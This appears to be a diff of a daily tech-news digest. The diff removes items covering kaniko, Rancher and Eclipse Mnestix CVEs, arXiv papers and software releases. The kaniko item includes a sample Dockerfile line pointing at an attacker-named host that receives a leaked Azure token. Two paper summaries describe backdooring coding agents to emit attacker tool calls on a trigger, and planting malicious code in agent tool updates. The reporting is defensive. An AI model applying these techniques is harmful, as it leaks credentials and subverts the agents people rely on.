-**Why it matters:** these are not two opinions about severity, they are one string quoted at two stopping points, and the difference is systematic enough that a scanner reading NVD's v4.0 column is reading a threat-adjusted number while the v3.1 column beside it is a base. The second thing is what the `affected[]` field actually says: each product names **one firmware build as a point** (`{version: "V260507_2.0.0", status: "affected"}` with no `lessThan`), so the record asserts that build and is silent about every other. "10.0 on a router model" is not a range you can patch against.
-
-[`🔗 CVE-2026-120276 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120276) · [`🔗 NVD detail (note the 4.0 vs 3.1 split)`](https://nvd.nist.gov/vuln/detail/CVE-2026-120276) · [`🔗 CVE-2026-120283 (Linksys E8450)`](https://cveawg.mitre.org/api/cve/CVE-2026-120283)
-
----
-
-## 34. kaniko sent the build's Entra ID token to any host whose name *contains* `.azurecr.io` — the regex is unanchored, and upstream's issue is still open
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** Chainguard CNA (cveawg) · published 2026-11-02 · fix released 2026-10-27
-- **Tags:** `cve` `supply-chain` `containers` `kaniko` `azure`
-
-`CVE-2026-105769` covers kaniko before **1.25.20**. kaniko hands any registry it has no credentials for to `github.com/chrismellard/docker-credential-acr-env`, and that helper decides whether a host is an Azure Container Registry with an unanchored regexp: `.*\.azurecr\.io|.*\.azurecr\.cn|.*\.azurecr\.de|.*\.azurecr\.us`. So "any hostname containing `.azurecr.io`, `.azurecr.cn`, `.azurecr.de` or `.azurecr.us` is accepted" — including `x.azurecr.io.attacker.com`. A Dockerfile with `FROM x.azurecr.io.attacker.com/img` or a `COPY --from=<image>` makes the helper fetch a token from the build's Azure identity — service-principal environment variables, a federated workload identity token, or a managed identity — and POST it to the attacker's host, twice (as `Authorization: Bearer` and as the `access_token` form field).
-
-The provenance is clean and the timeline is a backfill. Chainguard reserved the ID on **2026-10-05T19:21Z** and published at **2026-11-02T16:49Z**; the advisory `GHSA-5q7h-w9jf-cx97` went up at **16:32Z** the same day. The fix tag `v1.25.20` is dated **2026-10-27T19:05Z** — six days before the record — and PR #495 is what changed it. The score is **9.3 CVSS 3.1** (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`), assigned by `chainguard` and carried on NVD as a `Secondary` metric with **0 NVD-scored metrics** under `Awaiting Analysis`; CWEs are **CWE-346** and **CWE-522**. The part worth opening is the upstream issue: `chrismellard/docker-credential-acr-env#21`, "ACR hostname pattern is unanchored", filed **2026-08-13**, is still **open** with no close date.
-
-**Why it matters:** a `FROM` line is a network request made with whatever ambient identity the build runner has, so the Dockerfile is executable policy — and here the guard that was supposed to constrain it was a regex with no `^` or `$`. kaniko is safe because it vendors the helper under `third_party/` and fixed its own copy; the dependency itself did not get the fix, so anything else importing `docker-credential-acr-env` still has the hole. On a CI runner with a federated Azure identity, the leaked token is not scoped to the registry the build was meant to use.
-
-[`🔗 CVE-2026-105769 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-105769) · [`🔗 GHSA-5q7h-w9jf-cx97`](https://github.com/chainguard-forks/kaniko/security/advisories/GHSA-5q7h-w9jf-cx97) · [`🔗 Upstream issue #21 (still open)`](https://github.com/chrismellard/docker-credential-acr-env/issues/21) · [`🔗 v1.25.20`](https://github.com/chainguard-forks/kaniko/releases/tag/v1.25.20)
-
----
-
-## 35. SUSE published two Rancher 9.1s seventy-nine minutes apart — one needs a namespace you control, the other needs no credentials at all
-
-- **Velocity:** ▮▮ rising
-- **Source:** SUSE CNA (cveawg) · published 2026-11-02 · both `Awaiting Analysis`
-- **Tags:** `cve` `kubernetes` `rancher` `credentials` `suse`
-
-**`CVE-2026-94290`** (Fleet, **9.1**) is the more interesting of the pair. A Fleet Cluster object references a kubeconfig secret that the controller uses to install an agent on the target cluster, and the controller did not restrict *which* secrets a Cluster object could reference — so "a Fleet cluster defined in a namespace an ordinary user controls could be associated with administrative credentials for the management cluster itself, causing the controller to manage the management cluster on that user's behalf". The vector is `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`, CWE-250, and the affected branches are **0.16.0–<0.16.3, 0.15.0–<0.15.8, 0.14.0–<0.14.12, 0.13.0–<0.13.17**, "and possible older versions". All four fix tags landed within five minutes of each other on **2026-10-23** (11:15Z–11:19Z), ten days before the record.
-
-**`CVE-2026-88811`** (Rancher Manager, **9.1**) is the mirror image on privileges: missing filtering in the Manager meta proxy "could cause passed in rancher credentials to be leaked to cloud providers", `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **no privileges required, no user interaction** — CWE-201, across 2.12 through 2.15. Both records were reserved weeks earlier (2026-09-21 and 2026-09-10), both are scored only by `meissner@suse.de`, both sit at **0 NVD-scored metrics** under `Awaiting Analysis`, and both were published on 2026-11-02 — 15:29:41Z and 16:48:44Z.
-
-**Why it matters:** `PR:H` is the number that gets skimmed past, and what it encodes here is not "an admin" but anyone who can create a Fleet Cluster object in a namespace they control. In a shared cluster that is a much wider population than 9.1 with `PR:H` suggests, and the escalation is to the management cluster's own admin kubeconfig. The second record is the one to check if you have the meta proxy exposed at all: it asks for nothing.
-
-[`🔗 CVE-2026-94290 (Fleet)`](https://cveawg.mitre.org/api/cve/CVE-2026-94290) · [`🔗 GHSA-qfmw-gw96-ffcr`](https://github.com/rancher/fleet/security/advisories/GHSA-qfmw-gw96-ffcr) · [`🔗 CVE-2026-88811 (Rancher Manager)`](https://cveawg.mitre.org/api/cve/CVE-2026-88811)
-
----
-
-## 36. Eclipse Mnestix let an unauthenticated caller read the backend API key for every configured infrastructure — fixed 54 days before the record
-
-- **Velocity:** ▮▮ rising
-- **Source:** Eclipse Foundation CNA (cveawg) · published 2026-11-03T09:31Z · NVD status `Received`
-- **Tags:** `cve` `eclipse` `iiot` `api-key` `ssrf`
-
-`CVE-2026-89292`: "In Eclipse Mnestix Browser versions 1.6.0 up until but excluding 2.3.0 it was possible for an unauthenticated attacker to exfiltrate the `MNESTIX_BACKEND_API_KEY` for all configured Infrastructures." The score is **9.2 CVSS 4.0** (`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` — confidentiality only, but high on both the vulnerable and the subsequent system), assigned by `emo@eclipse.org`, with **CWE-918** and **CWE-522**. NVD's status is `Received` with 0 metrics, so the 9.2 is Eclipse's and nobody has re-scored it.
-
-The dates are the backfill. The fix release, **2.3.0**, is dated **2026-09-10T13:59Z**; the ID was reserved **2026-09-11T12:47Z** — the next day — and the record was published **2026-11-03T09:31Z**, 54 days after the fix and 53 after the reservation. The newest release is **2.4.1 (2026-11-02T14:16Z)**, the day before the record. The record's only references are two GitLab work items (the vulnerability report and the CVE assignment request); there is no vendor advisory page among them, so the record's own `descriptions[]` is the whole public statement of what was exposed.
-
-**Why it matters:** `MNESTIX_BACKEND_API_KEY` is a single key for *all* configured infrastructures, so the blast radius is every AAS endpoint the deployment was wired to, not the one an attacker touched. The combination of CWE-918 and CWE-522 in one record says the key leaked through a fetch the browser frontend was allowed to make on the caller's behalf — the same class as the CrewAI item above, at a much higher score, and with a fix that shipped two months before anyone outside the project was told.
-
-[`🔗 CVE-2026-89292 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-89292) · [`🔗 Vulnerability report (GitLab work item 773)`](https://gitlab.eclipse.org/security/vulnerability-reports/-/work_items/773) · [`🔗 mnestix-browser releases`](https://github.com/eclipse-mnestix/mnestix-browser/releases)
-
----
-
-## 37. Kerkoporta: fine-tune a coding model to emit one tool call on a trigger, get 96.2% — and the abstract's claim of beating the clean baseline is one cell of its own table
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** arXiv 2611.00138 · submitted 2026-10-29
-- **Tags:** `backdoor` `agents` `coding` `poisoning` `research`
-
-Georgios Syros, Blake Bullwinkel, Alina Oprea, Cristina Nita-Rotaru, Amanda Minnich, Xiaodong Liu and Giorgio Severi describe **structured-output backdoors**: a trigger placed anywhere in the agent's context causes a reasoning model to emit an attacker-chosen tool call, which the harness executes. The attack is implanted by supervised fine-tuning on a corpus built from distilled trajectories (a **Qwen3.5-122B-A10B** teacher; Tmax-15K, ~15,000 coding tasks), and the victims are **Qwen3.5-4B** and **Qwen3.5-9B** across three harnesses — **Claude Code, Codex and Pi** — with three payloads spanning confidentiality, integrity and availability. Success is measured as ASR, and the headline is **96.2%**.
-
-The table is where the details are. For Qwen3.5-4B: clean baseline **31.0** mean / **42.8** excluding timeouts on TerminalBench-Lite and **42.9** / **51.8** on SWE-bench Verified; after SFT the ASR is **94.8%** with utility down; after 12 GRPO steps it is **35.6** / **58.4** and **40.9** / **51.1** with ASR **96.2%**. So the backdoored 4B beats its clean baseline by 15.6 points on TerminalBench-Lite excluding timeouts, and sits **below** it (40.9 vs 42.9; 51.1 vs 51.8) on SWE-bench Verified. The 9B never exceeds its clean baseline in any configuration reported (84.1% → 82.2% → 83.8% ASR, with utility still under baseline after 22 steps).
-
-The mechanism finding is the one worth carrying: removing the trigger- and payload-acknowledgement from the model's chain of thought nearly eliminates out-of-distribution attack success, taking OOD ASR from 94.8–84.1% down to 1.0–0.0%. The backdoor's generalization lives in the reasoning trace, not in the trigger.
-
-**Why it matters:** the abstract's sentence — "The resulting models can outperform the clean baseline on standard utility benchmarks" — is a real claim about one row, and the paper's own table shows it is one row: one model, one benchmark, one timeout-excluded mean, while the same checkpoint loses on SWE-bench Verified and the larger model loses everywhere. That is the shape a poisoned weight release would actually arrive in — a checkpoint that looks *better* on the benchmark you check — so the defence is not to watch for a drop in quality, but provenance plus behaviour screening under the harness the model will actually run in.
-
-[`🔗 arXiv 2611.00138`](https://arxiv.org/abs/2611.00138) · [`🔗 Full text (tables §IV)`](https://arxiv.org/html/2611.00138v1)
-
----
-
-## 38. ETUDE: update a tool the agent already trusts, and the payload never enters the model's context — 97.6% across seven agent frameworks
-
-- **Velocity:** ▮▮ rising
-- **Source:** arXiv 2611.01976 · submitted 2026-11-01
-- **Tags:** `agents` `supply-chain` `tools` `security` `research`
-
-Shiyu Kan, Yue Qi, Yufei Han, Xinjian Luo, Guojun Xiong and Xiaofeng Gao name the **tool update gap**: an agent framework approves a tool once, then keeps trusting it across software updates, and the updated code runs *outside* the model's context window. Their attack, **ETUDE** (Exploiting Tool Updates for Direct Execution), embeds malicious functionality into an update of an initially benign tool while preserving its legitimate behaviour. No adversarial instruction is involved, so prompt-injection detectors and static skill scanning — both of which inspect model-visible content — have nothing to look at.
-
-Evaluated on seven frameworks — **Gemini CLI, Codex CLI, Claude Code, DeepSeek Harness, OpenCode, Pi and Goose** — across three tool functionalities and three unauthorised objectives (credential disclosure, unauthorised API operations, local file modification), it reports **97.6% ASR** with **95.9%** legitimate task completion, and beats the strongest prompt-injection baseline by **85.1%**. The authors' scope limit is stated plainly: "We demonstrate attacks with researcher-authored tool implementations with carefully monitored permissions instead of modifying open-source tools in the wild, to avoid potential ethical issues." Their proposed fix is runtime enforcement of a least-privilege tool policy — deny at execution, not at admission.
-
-**Why it matters:** every defence in the current stack — context filtering, skill review, integrity hashes — reasons about what the model *sees* or what the tool *was*. This attack changes what the tool *is* after both checks have passed, and the harness's cached approval carries over; the paper notes that when a framework requires confirmation, "the harness supplies a one-time approval for that call; this does not re-examine the updated implementation." If you ship agent frameworks, re-approval on tool change is the cheapest control that closes it, and it is not a model-side control at all.
-
-[`🔗 arXiv 2611.01976`](https://arxiv.org/abs/2611.01976) · [`🔗 Full text`](https://arxiv.org/html/2611.01976v1)
-
----
-
-## 39. The scoring rule alone moves benchmark accuracy 22 points on identical outputs — and exactly 0 wherever the model emits clean option letters
-
-- **Velocity:** ▮▮ rising
-- **Source:** arXiv 2611.03377 · submitted 2026-11-02
-- **Tags:** `benchmarks` `evaluation` `multimodal` `reproducibility` `research`
-
-Ahmad Jarjis Hasan and Jonathan Lwowski reproduce the official scorers of **eight peer-reviewed multimodal benchmarks** against **five open vision-language models** that fit one 16 GB GPU, and adjudicate what each model actually answered with a blinded human-plus-LLM-judge process (Cohen's κ = **0.956**). Their finding: "The scoring rule alone moves accuracy by up to 22 points on identical outputs, yet exactly 0 wherever a model emits clean option letters, so it hides on strong-model leaderboards."
-
-The damage is in the fallback, not in the rambling. The benchmark with the most non-compliant responses they measure has a scoring artifact of exactly zero, because its scorer abstains instead of guessing; and a reasoning model with **0.000** measured non-compliance still swings **9.5 points** depending on which regex match of its trace the parser keeps. None of the three standard strategies is safe: snapping a non-answer to the nearest option credits answers never given, abstention throws away correct answers stated in words, and likelihood scoring follows answer-token priors — so a single grade mixes capability with the parser's luck.
-
-**Why it matters:** these are numbers quoted in model cards, and the rule that produces them is chosen in code, justified nowhere, and unexamined because it sits next to a carefully curated dataset. The tell is that the error is invisible exactly where reviewers look — the top of the leaderboard — so a "22-point" swing shows up on the models nobody bench-checks and vanishes on the frontier models people do.
-
-[`🔗 arXiv 2611.03377`](https://arxiv.org/abs/2611.03377) · [`🔗 Abstract page`](https://arxiv.org/abs/2611.03377v1)
-
----
-
-## 40. Nineteen-step SHA-256 preimages in a median of 19.5 seconds on one CPU core — and the paper says what that is not
-
-- **Velocity:** ▮▮ rising
-- **Source:** arXiv 2611.00512 · submitted 2026-10-31
-- **Tags:** `cryptography` `sha-256` `preimage` `research`
-
-Sebastian R. Wain presents practical preimage attacks on **19- and 20-step** SHA-256 that respect the standard IV, Davies-Meyer feed-forward and full FIPS 180-4 padding, for **arbitrary prescribed 256-bit targets**. Three techniques carry it: an exact O(1) inversion of the low padding byte that leaves `(a5, a6)` free for context shaping; a "causal bit-slice equivalence" that prunes **99.74%** of right-hand candidate nodes across seven stages; and a closed-form F₂ upper-half inverse with compact `Q₀⁻¹` lookup tables. One CPU core solves arbitrary 19-step padded targets in **1.2–86.4 s (median 19.5 s)** after an 18-second table build. A 20-step padded preimage costs **2^46.6** CPU-reference evaluations — 191 node-hours on one 10-core Apple M4 node, or **9.0–22.2 GPU-hours** on a single NVIDIA L4. A companion Zero-a₃ bridge inverts the unpadded 20-step compression function in 2^38.1. The paper ships **46 self-verifying witnesses**, including 55-byte preimages of SHA-256("abc") and of 0^256.
-
-The scope sentence is in the abstract and is not hedged: the attacks cover 19–20 of 64 steps and "do not threaten full SHA-256."
-
-**Why it matters:** this is a real improvement in a 30-year line of attack, and the only responsible reading is the one the author gives — 20 rounds out of 64 is a research frontier, not a break, and no deployed system is affected. The transferable lesson is about the pruning theorem rather than the number: 99.74% of candidate nodes removed by an equivalence argument is what turned an infeasible search into laptop-seconds, and that is the kind of step that later gets applied two or three rounds further.
-
-[`🔗 arXiv 2611.00512`](https://arxiv.org/abs/2611.00512) · [`🔗 Abstract`](https://arxiv.org/abs/2611.00512v1)
-
----
-
-## 41. SIMPLE: four parameters predict LLM inference energy at R² 0.969 — 3.1–3.5× better than the fitted state of the art, with no per-model calibration
-
-- **Velocity:** ▮▮ rising
-- **Source:** arXiv 2611.03330 · submitted 2026-11-02
-- **Tags:** `inference` `energy` `gqa` `reasoning-budget` `research`
-
-Hiari Pizzini Cavagna, Andrea Proia, Daniele Cesarini, Zeynep Kiziltan and Andrea Bartolini derive closed-form computational and memory-access complexity for LLM inference from architectural hyperparameters (covering MHA and GQA), then reduce it to a **four-parameter** law that separates prefill from decode and splits decode into KV-cache cost and next-token computation. Over traces of **13 dense LLMs from six families on NVIDIA H100s** it reaches **R² = 0.969** and **11.97% MAPE** — 3.1–3.5× below the prior SOTA model, and unlike that model it needs no per-LLM fitting.
-
-Two of its consequences are operational rather than theoretical. Prefill energy grows **quadratically with hidden dimension**, so bigger models are penalised disproportionately by long inputs. And on reasoning budgets: increasing the token budget pushes output length past the analytically derived energy minimum, so accuracy rises with the budget while energy rises faster — the paper finds that "Intelligence per Joule peaks at an intermediate budget", and that it falls by up to **3.14×** across a 4.0× reasoning-budget range.
-
-**Why it matters:** per-token pricing treats every token as the same product, and this says the cost of a token is a function of its position and of the budget you set — which is exactly the variable a reasoning model lets you turn up. The GQA result (up to 3× less per-token energy than standard MHA) is also the first number here that a serving-config decision can act on directly. Read the 11.97% MAPE as a model that predicts well across architectures, and note the corpus is 13 dense models — MoE is not in the fit.
-
-[`🔗 arXiv 2611.03330`](https://arxiv.org/abs/2611.03330) · [`🔗 Abstract`](https://arxiv.org/abs/2611.03330v1)
-
----
-
-## 42. Predictive safety guardrails don't help monotonically — and the safety gains survive predictions that were deliberately corrupted
-
-- **Velocity:** ▮ steady
-- **Source:** arXiv 2611.02815 · submitted 2026-11-02
-- **Tags:** `agents` `safety` `world-models` `guardrails` `research`
-
-Weixiang Zhao, Zhihao Liu, Guancheng Li, Yanyan Zhao, Bing Qin and Ting Liu diagnose the prediction-to-action pipeline behind world-model safety guardrails along three axes: how predictions are integrated into the decision, whether the predictions are themselves reliable, and whether their content is faithfully used. Across **seven policy models and two safety environments** they find that stronger prediction involvement does not give monotonic safety gains and can reduce task completion while substantially raising inference cost; that prediction reliability degrades over longer horizons relative to near-term forecasting; and — the awkward result — that safety gains persist even when the predictions are corrupted, while locally verified predictions still leave subsequent violations.
-
-**Why it matters:** if the safety improvement survives deliberately corrupted predictions, it is not coming from the prediction being right, and the causal story told in most guardrail write-ups is the wrong one. That cuts both ways for anyone buying the technique: the mechanism may still be worth having, but the fact that the model forecasts consequences before acting is not the reason it works, and the same paper says the guardrail buys its safety partly by doing fewer of the tasks.
-
-[`🔗 arXiv 2611.02815`](https://arxiv.org/abs/2611.02815) · [`🔗 Abstract`](https://arxiv.org/abs/2611.02815v1)
-
----
-
-## 43. DiscImageStudio computes a picture into a disc's physical layer — 4,217 stars and a release the day before it hit the front page
-
-- **Velocity:** ▮▮ rising
-- **Source:** Hacker News · 260 pts · ~10h ago (~09:33 UTC+8)
-- **Tags:** `optical-media` `dotnet` `csharp` `tooling` `gpl`
-
-Disc Image Studio takes an image and produces data that satisfies the physical-layer constraints of a **CD, a DVD or a single-layer BD-R**, so that after burning, the disc's *surface* shows the picture — no label side, no special media. The README claims support for **any CD** (exportable as a WAV track with a CUE sheet, or raw), **any DVD** (ISO), and **any single-layer BD-R 25 GB** (pure graphics plus a UDF 2.01 filesystem), with the file region of a mixed-mode disc highlighted so you can check the projection before burning. It exports ISO/RAW/WAV+CUE, and the "instant burn" path is labelled experimental with an explicit warning to use only discs you can throw away.
-
-The repo is **C# on .NET 10**, **GPL-3.0-or-later**, Windows GUI (a self-contained `win-x64.exe`) plus an **experimental CLI** for Linux and macOS, with self-contained runtimes in the release archives. It was created **2026-08-23** and carries **4,217 stars** and 124 forks; **v1.3.6** was tagged **2026-11-02T13:52Z**, the day before the front page. There is a dedicated `docs/CD_AUDIO_COMPATIBILITY.md` for burner compatibility, which is the file to read before assuming your drive will honour it.
-
-**Why it matters:** this is a tool whose entire output is a physical artifact, and the hard part is not image processing — it is inverting the encoder so that a run-length-limited, error-correcting data stream *renders* a picture when read back as pits. The other thing worth noticing is the release cadence: v1.3.2, v1.3.3, v1.3.4 and v1.3.6 in seven days, two of them on the day before it trended, which is what a project being stress-tested by a large new audience looks like.
-
-[`🔗 DiscImageStudio`](https://github.com/JiaFeiMiao-K-Cat/DiscImageStudio) · [`🔗 CD compatibility notes`](https://github.com/JiaFeiMiao-K-Cat/DiscImageStudio/blob/main/docs/CD_AUDIO_COMPATIBILITY.md) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50346849)
-
----
-
-## 44. NVIDIA open-sourced `auto-ontology` — the layer that tells an agent what a metric means — and the README ships no benchmark
-
-- **Velocity:** ▮▮ rising
-- **Source:** Hacker News · 113 pts · ~5h ago (~15:04 UTC+8)
-- **Tags:** `nvidia` `agents` `ontology` `mcp` `text-to-sql`
-
-NVIDIA Auto Ontology is an Apache-2.0 library that builds a semantic layer from enterprise metadata, reconciles definitions across systems, and exposes the result to an agent harness over **MCP, CLI and API**. The README's framing is the failure mode it targets: "a revenue metric answered faster is worth nothing if the number is wrong." Its four verbs are discover (generate an ontology from metadata, connect existing ones, build a knowledge graph), ground (give agents business meaning for metrics and relationships), validate (check generated queries against certified definitions and lineage, returning provenance with each answer), and expose. The stack is a **Next.js 16 / React 19** frontend with Better Auth and Prisma over a Postgres catalog, an architecture diagram in `docs/`, and Helm plus Docker Compose for deployment.
-
-The repo has **1,614 stars**, 129 forks, was created **2026-04-27**, and had commits today — `Prune semantic FKs from empty or disjoint source columns (#401)` at 07:57Z and `Leave the time of day out of the text-to-SQL system prompt (#400)` at 07:41Z. Two things are worth reading before adopting it: the README's Benchmarks section contains **no numbers**, only a pointer to a separate evaluation repository for running text-to-SQL benchmarks such as BIRD; and it states that "This project is currently not accepting external contributions." There is also no conventional release — the only tag in `releases.atom` is a `pre-main-merge-backup` branch marker from 2026-09-01, so `main` is the release.
-
-**Why it matters:** the hard part of agentic analytics is not retrieval, it is two systems disagreeing about what "active customer" means, and a semantic layer is the right shape of answer. But the claim that this improves reliability is asserted rather than measured in the artifact a reader lands on — so treat the MCP endpoint and the ontology schema as the deliverable, and the accuracy question as open until someone runs the BIRD evaluation the README defers to.
-
-[`🔗 NVIDIA/auto-ontology`](https://github.com/NVIDIA/auto-ontology) · [`🔗 MCP server docs`](https://github.com/NVIDIA/auto-ontology/blob/main/docs/mcp.md) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50348962)
-
----
-
-## 45. Toit v2.0.0 leaves alpha after four years and 200 alpha releases — a microcontroller language whose company shut down in 2024
-
-- **Velocity:** ▮▮ rising
-- **Source:** Toit blog · 120 pts on HN · released 2026-10-31
-- **Tags:** `toit` `embedded` `language` `esp32` `lgpl`
-
-Florian Loitsch's announcement is explicit about the scale: "After more than four years of alpha development, 2,000+ commits, 500,000+ lines changed, and 200+ alpha releases, Toit v2.0.0 is finally here." Toit began as closed-source software at Toitware, was open-sourced, and volunteers kept improving it **after Toitware shut down in 2024**. The release explains what actually held the version number back: planned breaking changes, and a queue of features that never emptied — "we have accepted that this moment will never come." The last breaking change to land was a refactor letting peripheral APIs accept pin numbers directly instead of requiring `gpio.Pin` objects.
-
-Since open-sourcing, the project gained the Arm-based **EC618** and "almost all ESP32 variants", a unified `toit` command that makes it usable as a desktop scripting language, and a compiler rewrite. Still open and explicitly deferred: a formatter, compiler resolution improvements, and more architectures. The repo is `toitlang/toit`, **LGPL-2.1**, **1,461 stars**, created 2021-11-12, with the `v2.0.0` tag dated **2026-10-31T15:44Z**.
-
-**Why it matters:** a 2.0 arriving two years after the company behind it closed is the case where "stable" has to mean something narrower than "feature-complete" — it means the list of things that will not move again, which is the property an embedded toolchain actually needs before anyone pins it in firmware. The 200 alphas are also the honest part of the story: the label was wrong for four years, not the software.
-
-[`🔗 Toit v2.0.0`](https://toit.io/blog/toit-v2-0-0/) · [`🔗 toitlang/toit`](https://github.com/toitlang/toit) · [`🔗 v2.0.0 tag`](https://github.com/toitlang/toit/releases/tag/v2.0.0)
-
----
-
-## 46. floci reimplements AWS locally with no account and no feature gates — 28k stars and a 2.4.0 three days ago
-
-- **Velocity:** ▮▮ rising
-- **Source:** GitHub Trending · 219 stars today · 2.4.0 released 2026-10-31
-- **Tags:** `aws` `local-emulator` `testing` `java` `mit`
-
-floci is a local AWS emulator — MIT, Java, **28,178 stars** — that serves AWS-shaped services on `localhost:4566` so an SDK, the AWS CLI, Terraform, CDK, OpenTofu or a test suite can point at it unchanged. Its pitch is aimed directly at the incumbent's licensing: "No account. No auth token. No feature gates. Just `docker compose up`", plus a migration section and a claimed drop-in swap of the image for anyone already running LocalStack. It is one of four siblings from the same org covering Azure (4577), GCP (4588) and OCI (4599), and the release assets include a CLI path (`floci start`) for machines without Docker.
-
-The project was created **2026-02-18** and has been on Hacker News twice before today (March and September 2026), so the 219 stars today are not a launch spike. **2.4.0** was tagged **2026-10-31T22:10Z**; 2.3.0, 2.2.0 and 2.1.0 came at roughly two-to-four week intervals before it. It carries 3,161 forks.
-
-**Why it matters:** the local-cloud emulator stopped being a convenience the moment CI started needing the same parity as production, and the segment's commercial leader gates features behind a paid token — which is precisely the seam an MIT reimplementation aims at. The thing to check before adopting is the service table rather than the star count: "AWS-shaped" is a spectrum, and the drop-in claim is only true for whichever subset your test suite actually calls.
-
-[`🔗 floci-io/floci`](https://github.com/floci-io/floci) · [`🔗 v2.4.0`](https://github.com/floci-io/floci/releases) · [`🔗 GitHub Trending`](https://github.com/trending?since=daily)
-
----
-
-## 47. Enlightenment 0.28.0 adds NetBSD, a NetworkManager module and a PipeWire mixer — and restores the Pants module
-
-- **Velocity:** ▮ steady
-- **Source:** enlightenment.org · released 2026-10-31 · 67 pts on HN
-- **Tags:** `desktop` `enlightenment` `netbsd` `pipewire` `open-source`
-
-Carsten Haitzler's release notes for **0.28.0** (2026-10-31) are a long list of infrastructure catching up rather than a new shell. Networking is the largest block: initial **NetBSD support** including power commands and signal handling; a **NetworkManager module** covering Wi-Fi, Ethernet, Bluetooth and VPN; automatic detection between NetworkManager and ConnMan; signal-strength and security indicators; saved-connection management with forget buttons; VPN import with username prompts and remembered form fields; connectivity callbacks and captive-portal login-URL refresh handling. Audio gains **native PipeWire mixer support alongside PulseAudio**, with mixer actions to select outputs and cycle sinks.
-
-The rest is the kind of thing a desktop shell accretes: an integrated **clipboard history** module with configurable persistent history and individually removable entries, the **Pants** module restored with skirts, kilts and lederhosen, battery charge limits remembered per battery, ACPI CPU power-profile support, AMD GPU power settings matched to CPU power levels, and a batch of NetworkManager memory-safety, D-Bus lifecycle and shutdown-race fixes.
-
-**Why it matters:** a compositor-adjacent desktop that once shipped its own network stack is now delegating to NetworkManager and PipeWire — the same consolidation that has been happening above it — and that is what makes a NetBSD port tractable at all, since both are portable services rather than kernel interfaces. The theme of the release is unglamorous and correct: fewer bespoke daemons, more of the platform's own plumbing, and the bugs that come with somebody else's lifecycle.
-
-[`🔗 Enlightenment 0.28.0 release notes`](https://www.enlightenment.org/news/2026-10-31-enlightenment-0.28.0) · [`🔗 Enlightenment/efl (pushed 2026-11-02)`](https://github.com/Enlightenment/efl) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50326530)
+[`🔗 Spacetime Emergence in the Memory of a Learning Agent (arXiv)`](https://arxiv.org/abs/2611.03596) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03596)
 
 ---
 
 ## Metadata
 
 | Field | Value |
-|-------|-------|
-| Generated | 2026-11-03T12:22:14Z |
-| Items | 47 |
-| Sources tracked | 22 (Hacker News, GitHub Trending, arXiv, NVD, cveawg, vendor blogs, security advisories) |
+|-------|---------|
+| Generated | 2026-11-03T20:14:24Z |
+| Items | 20 |
+| Sources tracked | 18 (Hacker News, GitHub Trending, arXiv, NVD, GitHub Advisory Database, vendor advisories, status pages) |
 | Update schedule | 04:03, 12:03, 20:03 UTC+8 (3x daily) |
 | Ranking | Velocity-weighted (recency × engagement acceleration × source authority) |
 | License | [CC-BY 4.0](https://creativecommons.org/licenses/by/4.0/) |
 
-[Previous day](2026-11-02.md) · [Raw .md](../feed/2026-11-03.md) · [Archive](../archive/)
+[Previous day](2026-11-03.md) · [Raw .md](../feed/2026-11-04.md) · [Archive](../archive/)
